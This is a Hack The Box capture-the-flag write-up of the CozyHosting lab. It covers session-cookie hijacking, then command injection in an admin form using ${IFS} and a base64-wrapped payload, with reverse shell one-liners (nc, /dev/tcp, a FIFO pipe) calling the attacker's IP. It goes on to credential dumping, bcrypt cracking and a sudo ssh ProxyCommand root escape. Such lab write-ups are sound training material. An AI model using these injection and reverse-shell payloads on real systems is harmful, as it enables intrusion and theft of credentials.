---
title: Cozy Hosting Writeup
date: 2024-02-13 12:00 +0100
categories: [HTB Writeup]
tags: [cybersecurity, htb, writeup]
---


# CozyHosting Writeup

## Enumeration

First let's ping the machine see if it is up :

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Tools$ ping -c 3 10.10.11.230
PING 10.10.11.230 (10.10.11.230) 56(84) bytes of data.
64 bytes from 10.10.11.230: icmp_seq=1 ttl=63 time=24.9 ms
64 bytes from 10.10.11.230: icmp_seq=2 ttl=63 time=38.8 ms
64 bytes from 10.10.11.230: icmp_seq=3 ttl=63 time=27.4 ms

--- 10.10.11.230 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 24.934/30.377/38.761/6.015 ms
```

The host is up, let's do an nmap scan:

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Tools/dirsearch$ nmap -sV -sC -Pn 10.10.11.230 -p-10000
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-30 18:30 CET
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.025s latency).
Not shown: 9997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
3001/tcp open  nessus?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.89 seconds
```

We see only `ssh` which usually dont have any exploit right off the bat and the webserver on port 80. So let's add the IP to our `/etc/hosts` file and check the website :

<img src="/assets/img/CozyHostingWriteup/cozy-1.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

We can directly see a `login` page, but let's do an enumeration on all the folders :

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Tools/dirsearch$ python3 dirsearch.py -u cozyhosting.htb

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11718

Output: /home/kyll/Desktop/code_folder/Tools/dirsearch/reports/_cozyhosting.htb/_24-01-30_18-21-13.txt

Target: http://cozyhosting.htb/

[18:21:13] Starting: 
[...]
[18:22:00] 200 -    5KB - /actuator/env
[18:22:00] 200 -   15B  - /actuator/health
[18:22:01] 200 -   98B  - /actuator/sessions
[18:22:02] 200 -   10KB - /actuator/mappings
[18:22:05] 401 -   97B  - /admin
[18:22:08] 200 -  124KB - /actuator/beans
[18:22:09] 200 -    0B  - /admin/%3bindex/
[18:22:13] 200 -    0B  - /Admin;/
[18:22:13] 200 -    0B  - /admin;/
[18:22:44] 200 -    0B  - /axis//happyaxis.jsp
[18:22:44] 200 -    0B  - /axis2//axis2-web/HappyAxis.jsp
[18:22:44] 200 -    0B  - /axis2-web//HappyAxis.jsp
[18:22:55] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
[18:23:19] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf
[18:23:19] 200 -    0B  - /engine/classes/swfupload//swfupload.swf
[18:23:20] 500 -   73B  - /error
[18:23:22] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[18:23:23] 200 -    0B  - /extjs/resources//charts.swf
[18:23:36] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf
[18:23:47] 200 -    0B  - /jkstatus;
[18:23:55] 200 -    4KB - /login
[18:23:55] 200 -    0B  - /login.wdm%2e
[18:23:57] 204 -    0B  - /logout

Task Completed
```

## Hijacking session cookies

Okay now we can see that there are a lot of `/actuator/` folder and one in particular is `/actuator/sessions` which looks like this :

<img src="/assets/img/CozyHostingWriteup/cozy-2.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

This looks like session cookie, which mean that  we can try to access the `/admin` webpage using those cookies. Let's try to do that by launching burpsuite with intercept on:

<img src="/assets/img/CozyHostingWriteup/cozy-3.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

We change the request by changing the `JSESSIONID` variable and...

<img src="/assets/img/CozyHostingWriteup/cozy-4.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

It works! We now have access to kanderson's admin webpage.

## Exploiting ssh to get a reverse shell

Now we see that at the bottom of the webpage there is an option to include an host into automating patching. We can try to put a host into the `IP address field` and click submit, which greets us with this response :

<img src="/assets/img/CozyHostingWriteup/cozy-5.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

We see that this respond the output of an ssh command. We can assume that this injects our input into a shell. Meaning that we can try and inject our own bit of code. Meaning we'll try and put in our reverse shell. We can assume that the command is :

```bash
ssh [someoptions] $Username@$Hostname
```

Knowing that the `$Hostname` variable needs to follow the IP format so we won't be able to do much with it. *But* we can tamper with the `$Username` variable. We want to do a reverse shell. I have tried a reverse shell with `nc -c sh 10.10.14.87 12345` (or with `-e`), but the distant machine doesn't support these options, meaning I won't be able to use those. Also the `sh -i >& /dev/tcp/10.10.14.87/12345 0>&1` command shows a `bad file descriptor` error. So we have to use another, more exotic way found [here](https://spencerdodd.github.io/2017/02/21/reverse_shell_without_nce/).

Long story short we do :

```bash
mknod /tmp/f p
```

then :

```bash
/bin/sh 0</tmp/f | nc 10.10.14.87 12345 1>/tmp/f
```

The problem with all of this is that we cannot directly inject these into our username because it includes spaces and the `$Username` variable shouldn't contain spaces. In order to do this, we can replace spaces with the `${IFS}` variable.

But in order to minimize the number of `${IFS}` variables, we might as well directly turn the payload in base64 and send it. If send  `;echo${IFS}"[PAYLOAD"]|base64${IFS}-d|bash;`, then it should expand to :

```bash
ssh [someoptions] ;echo${IFS}"[PAYLOAD"]|base64 -d|bash;@$Hostname
```

This will first `ssh [someoptions]`, which will give an error then `echo${IFS}"[PAYLOAD"]|base64 -d|bash` which will decode the `[PAYLOAD]` from base64 then execute it. Then try the command `@$Hostname` which doesn't exist.

So if instead of `[PAYLOAD]` we have `bWtub2QgL3RtcC9mIHAK` (`mknod /tmp/f p` in base64) and then `L2Jpbi9zaCAwPC90bXAvZiB8IG5jIDEwLjEwLjE0Ljg3IDEyMzQ1IDE+L3RtcC9mCg==` (`/bin/sh 0</tmp/f | nc 10.10.14.87 12345 1>/tmp/f` in base64). We should have something that try to connect to us.

We now only need to wait for the reverse with `nc -lvnp 12345` on our terminal aaaand, we have a shell :

<img src="/assets/img/CozyHostingWriteup/cozy-6.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

## Stealing jar file

Once we have our shell, let's stabilize it using this [method](https://maxat-akbanov.com/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal):

<img src="/assets/img/CozyHostingWriteup/cozy-7.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Okay so we see that there is a `cloudhosting-0.0.1.jar` file, let's steal that using our favorite python3 module `http.server` :

```bash
app@cozyhosting:/app$ python3 -m http.server 6868 &
[1] 50085
app@cozyhosting:/app$ Serving HTTP on 0.0.0.0 port 6868 (http://0.0.0.0:6868/) ...
```

let's visit the new webserver we've created and steal that jar file :

<img src="/assets/img/CozyHostingWriteup/cozy-8.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Extract the archive and check what's inside. We find the file `cloudhosting-0.0.1/BOOT-INF/classes/application.properties` and it looks like this :

```
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

## Database

This previous file tells us that there is a postgreql database running locally on the server so let's try to connect using the credentials found in the file (username `postgres` and password `Vg&nvzAQ7XxR`) :

```bash
app@cozyhosting:/app$ psql -h 127.0.0.1 -p 5432 -U postgres
Password for user postgres: 
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.
```

We're in, let's check the list of databases using `\l`:

```
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
```

Let's connect to the cozyhosting database using `\c cozyhosting` and list the tables in it using `\d` :

```
              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
(3 rows)
```

List what's inside of the user table using `select * from users;` :

```
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

We have 2 password hashes to crack now, let's check the different users before trying to crack one of them by using `cat /etc/passwd` :

```
[...]
app:x:1001:1001::/home/app:/bin/sh
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Looks like either `josh` or `laurel_` is the admin.

## Cracking the password

We have to crack the admin password, let's first check chat kind of hash this is :

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/HTB/CozyHosting$ hashid
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
Analyzing '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
```

This is bcrypt, we can now use John the ripper to crack the password like this :

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/HTB/CozyHosting$ john --format=bcrypt --wordlist=/home/kyll/Desktop/code_folder/Tools/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
manchesterunited (admin)     
1g 0:00:00:13 DONE (2024-02-02 15:47) 0g/s 210.0p/s 210.0c/s 210.0C/s onlyme..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

So the password is `manchesterunited` ! Let's try connecting in ssh to one of the potential admin users that we found before :

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Software_exploitation/HTB/CozyHosting$ ssh josh@10.10.11.230
josh@10.10.11.230's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)

[...]

Last login: Fri Feb  2 14:16:11 2024 from 10.10.16.23
josh@cozyhosting:~$ 
```

We are now connected as `josh` into that machine! and we can access `user.txt` :

```
josh@cozyhosting:~$ cat user.txt 
c7294bc90b8251319269769369ed5ff1
```

## Privilege escalation

One of the first thing when trying to do privilege escalation is trying to check what program we can execute as root. To do this, we do a `sudo -l` :

```
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Sorry, try again.
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

We can run `ssh` as root, this is our winning card. Using [this](https://gtfobins.github.io/gtfobins/ssh/) technique, we can instantly access `root` privilege :

```
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# whoami
root
# cat ~/root.txt
a6a1404347b1452f9284e1fea77db99e
```

And there we have it, we have root access to CozyHosting!
